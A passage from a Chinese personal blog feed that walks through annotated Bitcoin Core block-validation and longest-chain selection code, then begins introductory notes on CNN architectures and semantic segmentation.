class="built_in">ToString</span>(), tx_state.<span class="built_in">GetDebugMessage</span>()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. sigops个数不能超过限定值</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nSigOps = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; tx : block.vtx)</span><br><span class="line">    &#123;</span><br><span class="line">        nSigOps += <span class="built_in">GetLegacySigOpCount</span>(*tx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nSigOps * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_SIGOPS_COST)</span><br><span class="line">        <span class="keyword">return</span> state.<span class="built_in">Invalid</span>(BlockValidationResult::BLOCK_CONSENSUS, <span class="string">&quot;bad-blk-sigops&quot;</span>, <span class="string">&quot;out-of-bounds SigOpCount&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fCheckPOW &amp;&amp; fCheckMerkleRoot)</span><br><span class="line">        block.fChecked = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AcceptBlock"><a href="#AcceptBlock" class="headerlink" title="AcceptBlock"></a>AcceptBlock</h3><p><code>src\validation.cpp</code>中的<code>CChainState::AcceptBlock</code>函数，用于接收区块，负责基本的验证、链接到对应链上、广播到网络中、保存到本地磁盘等。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Store block on disk. If dbp is non-nullptr, the file is known to already reside on disk */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CChainState::AcceptBlock</span><span class="params">(<span class="type">const</span> std::shared_ptr&lt;<span class="type">const</span> CBlock&gt;&amp; pblock, BlockValidationState&amp; state, CBlockIndex** ppindex, <span class="type">bool</span> fRequested, <span class="type">const</span> FlatFilePos* dbp, <span class="type">bool</span>* fNewBlock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> CBlock&amp; block = *pblock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fNewBlock) *fNewBlock = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">AssertLockHeld</span>(cs_main);</span><br><span class="line"></span><br><span class="line">    CBlockIndex *pindexDummy = <span class="literal">nullptr</span>;</span><br><span class="line">    CBlockIndex *&amp;pindex = ppindex ? *ppindex : pindexDummy;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 接收区块头：</span></span><br><span class="line">    <span class="comment">//   检查是否有重复区块头、是否存在父区块、是否延续于不合法区块之后（分叉情况）</span></span><br><span class="line">    <span class="comment">//   将区块头链接到对应的链上（可能会出现分叉情况）</span></span><br><span class="line">    <span class="type">bool</span> accepted_header = m_blockman.<span class="built_in">AcceptBlockHeader</span>(block, state, m_params, &amp;pindex);</span><br><span class="line">    <span class="built_in">CheckBlockIndex</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!accepted_header)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to process all requested blocks that we don&#x27;t have, but only</span></span><br><span class="line">    <span class="comment">// process an unrequested block if it&#x27;s new and has enough work to</span></span><br><span class="line">    <span class="comment">// advance our tip, and isn&#x27;t too many blocks ahead.</span></span><br><span class="line">    <span class="type">bool</span> fAlreadyHave = pindex-&gt;nStatus &amp; BLOCK_HAVE_DATA;</span><br><span class="line">    <span class="type">bool</span> fHasMoreOrSameWork = (m_chain.<span class="built_in">Tip</span>() ? pindex-&gt;nChainWork &gt;= m_chain.<span class="built_in">Tip</span>()-&gt;nChainWork : <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Blocks that are too out-of-order needlessly limit the effectiveness of</span></span><br><span class="line">    <span class="comment">// pruning, because pruning will not delete block files that contain any</span></span><br><span class="line">    <span class="comment">// blocks which are too close in height to the tip.  Apply this test</span></span><br><span class="line">    <span class="comment">// regardless of whether pruning is enabled; it should generally be safe to</span></span><br><span class="line">    <span class="comment">// not process unrequested blocks.</span></span><br><span class="line">    <span class="type">bool</span> fTooFarAhead = (pindex-&gt;nHeight &gt; <span class="built_in">int</span>(m_chain.<span class="built_in">Height</span>() + MIN_BLOCKS_TO_KEEP));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Decouple this function from the block download logic by removing fRequested</span></span><br><span class="line">    <span class="comment">// This requires some new chain data structure to efficiently look up if a</span></span><br><span class="line">    <span class="comment">// block is in a chain leading to a candidate for best tip, despite not</span></span><br><span class="line">    <span class="comment">// being such a candidate itself.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> deal better with return value and error conditions for duplicate</span></span><br><span class="line">    <span class="comment">// and unrequested blocks.</span></span><br><span class="line">    <span class="keyword">if</span> (fAlreadyHave) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fRequested) &#123;  <span class="comment">// If we didn&#x27;t ask for it:</span></span><br><span class="line">        <span class="keyword">if</span> (pindex-&gt;nTx != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">// This is a previously-processed block that was pruned</span></span><br><span class="line">        <span class="keyword">if</span> (!fHasMoreOrSameWork) <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// Don&#x27;t process less-work chains</span></span><br><span class="line">        <span class="keyword">if</span> (fTooFarAhead) <span class="keyword">return</span> <span class="literal">true</span>;        <span class="comment">// Block height is too high</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Protect against DoS attacks from low-work chains.</span></span><br><span class="line">        <span class="comment">// If our tip is behind, a peer could try to send us</span></span><br><span class="line">        <span class="comment">// low-work blocks on a fake chain that we would never</span></span><br><span class="line">        <span class="comment">// request; don&#x27;t process these.</span></span><br><span class="line">        <span class="keyword">if</span> (pindex-&gt;nChainWork &lt; nMinimumChainWork) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 再一次检查区块</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CheckBlock</span>(block, state, m_params.<span class="built_in">GetConsensus</span>()) ||</span><br><span class="line">        !<span class="built_in">ContextualCheckBlock</span>(block, state, m_params.<span class="built_in">GetConsensus</span>(), pindex-&gt;pprev)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (state.<span class="built_in">IsInvalid</span>() &amp;&amp; state.<span class="built_in">GetResult</span>() != BlockValidationResult::BLOCK_MUTATED) &#123;</span><br><span class="line">            pindex-&gt;nStatus |= BLOCK_FAILED_VALID;</span><br><span class="line">            setDirtyBlockIndex.<span class="built_in">insert</span>(pindex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">error</span>(<span class="string">&quot;%s: %s&quot;</span>, __func__, state.<span class="built_in">ToString</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 如果这个区块延续在当前的最佳链上，则调用src\net_processing.cpp</span></span><br><span class="line">    <span class="comment">// 中的PeerManagerImpl::NewPoWValidBlock函数广播这个区块</span></span><br><span class="line">    <span class="comment">// Header is valid/has work, merkle tree and segwit merkle tree are good...RELAY NOW</span></span><br><span class="line">    <span class="comment">// (but if it does not build on our best tip, let the SendMessages loop relay it)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IsInitialBlockDownload</span>() &amp;&amp; m_chain.<span class="built_in">Tip</span>() == pindex-&gt;pprev)</span><br><span class="line">        <span class="built_in">GetMainSignals</span>().<span class="built_in">NewPoWValidBlock</span>(pindex, pblock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将这个区块写入到磁盘中</span></span><br><span class="line">    <span class="comment">// Write block to history file</span></span><br><span class="line">    <span class="keyword">if</span> (fNewBlock) *fNewBlock = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        FlatFilePos blockPos = <span class="built_in">SaveBlockToDisk</span>(block, pindex-&gt;nHeight, m_chain, m_params, dbp);</span><br><span class="line">        <span class="keyword">if</span> (blockPos.<span class="built_in">IsNull</span>()) &#123;</span><br><span class="line">            state.<span class="built_in">Error</span>(<span class="built_in">strprintf</span>(<span class="string">&quot;%s: Failed to find position to write new block to disk&quot;</span>, __func__));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">ReceivedBlockTransactions</span>(block, pindex, blockPos);</span><br><span class="line">    &#125; <span class="built_in">catch</span> (<span class="type">const</span> std::runtime_error&amp; e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">AbortNode</span>(state, std::<span class="built_in">string</span>(<span class="string">&quot;System error: &quot;</span>) + e.<span class="built_in">what</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FlushStateToDisk</span>(state, FlushStateMode::NONE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CheckBlockIndex</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ActivateBestChain"><a href="#ActivateBestChain" class="headerlink" title="ActivateBestChain"></a>ActivateBestChain</h3><p><code>src\validation.cpp</code>中的<code>CChainState::ActivateBestChain</code>函数，更新当前链为最长链。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CChainState::ActivateBestChain</span><span class="params">(BlockValidationState&amp; state, std::shared_ptr&lt;<span class="type">const</span> CBlock&gt; pblock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Note that while we&#x27;re often called here from ProcessNewBlock, this is</span></span><br><span class="line">    <span class="comment">// far from a guarantee. Things in the P2P/RPC will often end up calling</span></span><br><span class="line">    <span class="comment">// us in the middle of ProcessNewBlock - do not assume pblock is set</span></span><br><span class="line">    <span class="comment">// sanely for performance or correctness!</span></span><br><span class="line">    <span class="built_in">AssertLockNotHeld</span>(cs_main);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ABC maintains a fair degree of expensive-to-calculate internal state</span></span><br><span class="line">    <span class="comment">// because this function periodically releases cs_main so that it does not lock up other threads for too long</span></span><br><span class="line">    <span class="comment">// during large connects - and to allow for e.g. the callback queue to drain</span></span><br><span class="line">    <span class="comment">// we use m_cs_chainstate to enforce mutual exclusion so that only one caller may execute this function at a time</span></span><br><span class="line">    <span class="built_in">LOCK</span>(m_cs_chainstate);</span><br><span class="line"></span><br><span class="line">    CBlockIndex *pindexMostWork = <span class="literal">nullptr</span>;</span><br><span class="line">    CBlockIndex *pindexNewTip = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="type">int</span> nStopAtHeight = gArgs.<span class="built_in">GetArg</span>(<span class="string">&quot;-stopatheight&quot;</span>, DEFAULT_STOPATHEIGHT);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// Block until the validation queue drains. This should largely</span></span><br><span class="line">        <span class="comment">// never happen in normal operation, however may happen during</span></span><br><span class="line">        <span class="comment">// reindex, causing memory blowup if we run too far ahead.</span></span><br><span class="line">        <span class="comment">// Note that if a validationinterface callback ends up calling</span></span><br><span class="line">        <span class="comment">// ActivateBestChain this may lead to a deadlock! We should</span></span><br><span class="line">        <span class="comment">// probably have a DEBUG_LOCKORDER test for this in the future.</span></span><br><span class="line">        <span class="built_in">LimitValidationInterfaceQueue</span>();</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">LOCK</span>(cs_main);</span><br><span class="line">            <span class="comment">// Lock transaction pool for at least as long as it takes for connectTrace to be consumed</span></span><br><span class="line">            <span class="built_in">LOCK</span>(<span class="built_in">MempoolMutex</span>());</span><br><span class="line">            CBlockIndex* starting_tip = m_chain.<span class="built_in">Tip</span>();</span><br><span class="line">            <span class="type">bool</span> blocks_connected = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// We absolutely may not unlock cs_main until we&#x27;ve made forward progress</span></span><br><span class="line">                <span class="comment">// (with the exception of shutdown due to hardware issues, low disk space, etc).</span></span><br><span class="line">                ConnectTrace connectTrace; <span class="comment">// Destructed before cs_main is unlocked</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 1. 获取最长链（最大工作量证明），删除不合法的候选链</span></span><br><span class="line">                <span class="keyword">if</span> (pindexMostWork == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                    pindexMostWork = <span class="built_in">FindMostWorkChain</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Whether we have anything to do at all.</span></span><br><span class="line">                <span class="keyword">if</span> (pindexMostWork == <span class="literal">nullptr</span> || pindexMostWork == m_chain.<span class="built_in">Tip</span>()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 2. 更新当前链为最长的链</span></span><br><span class="line">                <span class="type">bool</span> fInvalidFound = <span class="literal">false</span>;</span><br><span class="line">                std::shared_ptr&lt;<span class="type">const</span> CBlock&gt; nullBlockPtr;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">ActivateBestChainStep</span>(state, pindexMostWork, pblock &amp;&amp; pblock-&gt;<span class="built_in">GetHash</span>() == pindexMostWork-&gt;<span class="built_in">GetBlockHash</span>() ? pblock : nullBlockPtr, fInvalidFound, connectTrace)) &#123;</span><br><span class="line">                    <span class="comment">// A system error occurred</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                blocks_connected = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (fInvalidFound) &#123;</span><br><span class="line">                    <span class="comment">// Wipe cache, we may need another branch now.</span></span><br><span class="line">                    pindexMostWork = <span class="literal">nullptr</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pindexNewTip = m_chain.<span class="built_in">Tip</span>();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 3. 通知各监听器当前链发生变化</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">const</span> PerBlockConnectTrace&amp; trace : connectTrace.<span class="built_in">GetBlocksConnected</span>()) &#123;</span><br><span class="line">                    <span class="built_in">assert</span>(trace.pblock &amp;&amp; trace.pindex);</span><br><span class="line">                    <span class="built_in">GetMainSignals</span>().<span class="built_in">BlockConnected</span>(trace.pblock, trace.pindex);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (!m_chain.<span class="built_in">Tip</span>() || (starting_tip &amp;&amp; <span class="built_in">CBlockIndexWorkComparator</span>()(m_chain.<span class="built_in">Tip</span>(), starting_tip)));</span><br><span class="line">            <span class="keyword">if</span> (!blocks_connected) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">const</span> CBlockIndex* pindexFork = m_chain.<span class="built_in">FindFork</span>(starting_tip);</span><br><span class="line">            <span class="type">bool</span> fInitialDownload = <span class="built_in">IsInitialBlockDownload</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4. 将最长链的高度和新区块告诉其它节点</span></span><br><span class="line">            <span class="comment">// Notify external listeners about the new tip.</span></span><br><span class="line">            <span class="comment">// Enqueue while holding cs_main to ensure that UpdatedBlockTip is called in the order in which blocks are connected</span></span><br><span class="line">            <span class="keyword">if</span> (pindexFork != pindexNewTip) &#123;</span><br><span class="line">                <span class="comment">// Notify ValidationInterface subscribers</span></span><br><span class="line">                <span class="built_in">GetMainSignals</span>().<span class="built_in">UpdatedBlockTip</span>(pindexNewTip, pindexFork, fInitialDownload);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Always notify the UI if a new block tip was connected</span></span><br><span class="line">                uiInterface.<span class="built_in">NotifyBlockTip</span>(<span class="built_in">GetSynchronizationState</span>(fInitialDownload), pindexNewTip);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// When we reach this point, we switched to a new tip (stored in pindexNewTip).</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nStopAtHeight &amp;&amp; pindexNewTip &amp;&amp; pindexNewTip-&gt;nHeight &gt;= nStopAtHeight) <span class="built_in">StartShutdown</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// We check shutdown only after giving ActivateBestChainStep a chance to run once so that we</span></span><br><span class="line">        <span class="comment">// never shutdown before connecting the genesis block during LoadChainTip(). Previously this</span></span><br><span class="line">        <span class="comment">// caused an assert() failure during shutdown in such cases as the UTXO DB flushing checks</span></span><br><span class="line">        <span class="comment">// that the best block hash is non-null.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ShutdownRequested</span>()) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (pindexNewTip != pindexMostWork);</span><br><span class="line">    <span class="built_in">CheckBlockIndex</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write changes periodically to disk, after relay.</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">FlushStateToDisk</span>(state, FlushStateMode::PERIODIC)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="选择最长链"><a href="#选择最长链" class="headerlink" title="选择最长链"></a>选择最长链</h2><p>在处理区块中所调用的<code>CChainState::ActivateBestChain</code>函数，负责更新当前链为最长链。在其过程中，会调用<code>src\validation.cpp</code>中的<code>CChainState::FindMostWorkChain</code>函数获取最长链。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the tip of the chain with the most work in it, that isn&#x27;t</span></span><br><span class="line"><span class="comment"> * known to be invalid (it&#x27;s however far from certain to be valid).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">CBlockIndex* <span class="title">CChainState::FindMostWorkChain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        CBlockIndex *pindexNew = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从后往前遍历候选链</span></span><br><span class="line">        <span class="comment">// setBlockIndexCandidates是候选链的集合，且按照一定的规则排序，越符合要求的链在越后面</span></span><br><span class="line">        <span class="comment">// Find the best candidate header.</span></span><br><span class="line">        &#123;</span><br><span class="line">            std::set&lt;CBlockIndex*, CBlockIndexWorkComparator&gt;::reverse_iterator it = setBlockIndexCandidates.<span class="built_in">rbegin</span>();</span><br><span class="line">            <span class="keyword">if</span> (it == setBlockIndexCandidates.<span class="built_in">rend</span>())</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">            pindexNew = *it;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历链上的区块，检查是否存在不合法的区块</span></span><br><span class="line">        <span class="comment">// Check whether all blocks on the path between the currently active chain and the candidate are valid.</span></span><br><span class="line">        <span class="comment">// Just going until the active chain is an optimization, as we know all blocks in it are valid already.</span></span><br><span class="line">        CBlockIndex *pindexTest = pindexNew;</span><br><span class="line">        <span class="type">bool</span> fInvalidAncestor = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> (pindexTest &amp;&amp; !m_chain.<span class="built_in">Contains</span>(pindexTest)) &#123;</span><br><span class="line">            <span class="built_in">assert</span>(pindexTest-&gt;<span class="built_in">HaveTxsDownloaded</span>() || pindexTest-&gt;nHeight == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pruned nodes may have entries in setBlockIndexCandidates for</span></span><br><span class="line">            <span class="comment">// which block files have been deleted.  Remove those as candidates</span></span><br><span class="line">            <span class="comment">// for the most work chain if we come across them; we can&#x27;t switch</span></span><br><span class="line">            <span class="comment">// to a chain unless we have all the non-active-chain parent blocks.</span></span><br><span class="line">            <span class="type">bool</span> fFailedChain = pindexTest-&gt;nStatus &amp; BLOCK_FAILED_MASK;</span><br><span class="line">            <span class="type">bool</span> fMissingData = !(pindexTest-&gt;nStatus &amp; BLOCK_HAVE_DATA);</span><br><span class="line">            <span class="comment">// 若存在不合法的区块，则删除该链</span></span><br><span class="line">            <span class="keyword">if</span> (fFailedChain || fMissingData) &#123;</span><br><span class="line">                <span class="comment">// Candidate chain is not usable (either invalid or missing data)</span></span><br><span class="line">                <span class="keyword">if</span> (fFailedChain &amp;&amp; (pindexBestInvalid == <span class="literal">nullptr</span> || pindexNew-&gt;nChainWork &gt; pindexBestInvalid-&gt;nChainWork))</span><br><span class="line">                    pindexBestInvalid = pindexNew;</span><br><span class="line">                CBlockIndex *pindexFailed = pindexNew;</span><br><span class="line">                <span class="comment">// Remove the entire chain from the set.</span></span><br><span class="line">                <span class="keyword">while</span> (pindexTest != pindexFailed) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fFailedChain) &#123;</span><br><span class="line">                        pindexFailed-&gt;nStatus |= BLOCK_FAILED_CHILD;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fMissingData) &#123;</span><br><span class="line">                        <span class="comment">// If we&#x27;re missing data, then add back to m_blocks_unlinked,</span></span><br><span class="line">                        <span class="comment">// so that if the block arrives in the future we can try adding</span></span><br><span class="line">                        <span class="comment">// to setBlockIndexCandidates again.</span></span><br><span class="line">                        m_blockman.m_blocks_unlinked.<span class="built_in">insert</span>(</span><br><span class="line">                            std::<span class="built_in">make_pair</span>(pindexFailed-&gt;pprev, pindexFailed));</span><br><span class="line">                    &#125;</span><br><span class="line">                    setBlockIndexCandidates.<span class="built_in">erase</span>(pindexFailed);</span><br><span class="line">                    pindexFailed = pindexFailed-&gt;pprev;</span><br><span class="line">                &#125;</span><br><span class="line">                setBlockIndexCandidates.<span class="built_in">erase</span>(pindexTest);</span><br><span class="line">                fInvalidAncestor = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pindexTest = pindexTest-&gt;pprev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 若不存在违法区块，则返回该链</span></span><br><span class="line">        <span class="keyword">if</span> (!fInvalidAncestor)</span><br><span class="line">            <span class="keyword">return</span> pindexNew;</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>FindMostWorkChain</code>函数所在的<code>CChainState</code>类中包含一个属性：<code>std::set&lt;CBlockIndex*, CBlockIndexWorkComparator&gt; setBlockIndexCandidates</code>候选链集合，该集合的排序规则定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CBlockIndexWorkComparator::operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> CBlockIndex *pa, <span class="type">const</span> CBlockIndex *pb)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// First sort by most total work, ...</span></span><br><span class="line">    <span class="keyword">if</span> (pa-&gt;nChainWork &gt; pb-&gt;nChainWork) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (pa-&gt;nChainWork &lt; pb-&gt;nChainWork) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... then by earliest time received, ...</span></span><br><span class="line">    <span class="keyword">if</span> (pa-&gt;nSequenceId &lt; pb-&gt;nSequenceId) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (pa-&gt;nSequenceId &gt; pb-&gt;nSequenceId) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use pointer address as tie breaker (should only happen with blocks</span></span><br><span class="line">    <span class="comment">// loaded from disk, as those all have id 0).</span></span><br><span class="line">    <span class="keyword">if</span> (pa &lt; pb) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (pa &gt; pb) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Identical blocks.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://doxygen.bitcoincore.org/index.html">Bitcoin Core: Main Page</a></p>
</li>
<li><p><a href="https://www.bookstack.cn/read/MasterBitcoin2CN/README.md">Introduction - 《《精通比特币》第二版》 - 书栈网 · BookStack</a></p>
</li>
<li><p><a href="https://juejin.cn/post/6844903598522892302">https://juejin.cn/post/6844903598522892302</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>浅入浅出语义分割</title>
    <url>/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>与祁老师一同参加2020年软件杯，选择了一个有关语义分割的题目。（项目完成一大半的时候，由于出题方很 nt 地中途把题目改成了目标识别和检测，我们最终被迫放弃。。。）</p>
<p>语义分割具体是什么就不解释了，大概是深度学习在计算机视觉上的一种运用罢了。</p>
<p>为了入门语义分割，我粗略地从经典的CNN网络，了解到语义分割的鼻祖——FCN网络，笔记如下。</p>
<span id="more"></span>

<h2 id="1-CNN"><a href="#1-CNN" class="headerlink" title="1. CNN"></a>1. CNN</h2><p>几个经典的CNN网络，由几篇经典论文提出。</p>
<p>参考：<a href="https://www.bilibili.com/video/BV1F4411y7o7?p=13">深度学习视频 - 吴恩达</a></p>
<h3 id="1-1-LeNet-5"><a href="#1-1-LeNet-5" class="headerlink" title="1.1. LeNet - 5"></a>1.1. LeNet - 5</h3><p>1980年的一篇论文种提出。对手写数字的灰度图（32x32x1）进行分类，基本结构是：<code>conv - pool - conv - pool - fc - fc - output</code>，激活函数是<code>sigmoid</code>和<code>tanh</code>（论文信息见图片左下角）。</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/1.png" alt="LeNet"></p>
<h3 id="1-2-AlexNet"><a href="#1-2-AlexNet" class="headerlink" title="1.2. AlexNet"></a>1.2. AlexNet</h3><p>2012年论文：ImageNet Classification with Deep Convolutional<br>Neural Networks。对 227x227x3 的图像进行 1000 种分类，大致的网络结构如下图。它相比于<code>LeNet</code>的优点：</p>
<ul>
<li><p>网络更大，参数更多。</p>
</li>
<li><p>使用 <code>ReLu</code> 激活函数。</p>
</li>
<li><p>使用 <code>Maxpooling</code>，而不是平均 <code>pooling</code>。</p>
</li>
<li><p>使用 <code>Dropout</code> 防止过拟合。原理很简单：根据设定的概率，选择性地丢弃当前神经元的输出，如下图：</p>
<p>  <img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/5.png" alt="dropout"></p>
</li>
<li><p>多个GPU并行计算（过时）。</p>
</li>
<li><p>使用局部响应归一层 LRN （没啥用？已过时）。</p>
</li>
</ul>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/2.png" alt="AlexNet"></p>
<p><code>AlexNet</code>的5层卷积层如下（224x224加2padding结果 约等于 227x227加0padding结果，论文的描述问题，不关键）：</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/3.png" alt="AlexNet"></p>
<h3 id="1-3-VGG-16"><a href="#1-3-VGG-16" class="headerlink" title="1.3. VGG - 16"></a>1.3. VGG - 16</h3><p>2015年论文：VERY DEEP CONVOLUTIONA NETWORKS FOR<br>LARGE-SCALE IMAGE RECOGNITION。</p>
<p>16代表有16层网络，其主要改进之处在于：经过多个卷积层后，再进行池化操作。基本结构如下图，<code>[CONV 64] x2</code> 表示：经过2个有64个<code>filter</code>的卷积层，卷积的规则如图上方所示。</p>
<p><img src="/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BA%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2/4.png" alt="VGG"></p>
<h2 id="2-语义分割"><a href="#2-语义分割" class="headerlink" title="2. 语义分割"></a>2. 语义分割</h2><h3 id="2-1-FCN"><a href="#2-1-FCN" class="headerlink" title="2.1. FCN"></a>2.1. FCN</h3><p>参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/35370022">精读深度学习论文(18) FCN</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/34453588">FCN 论文笔记</a></li>
</ul>
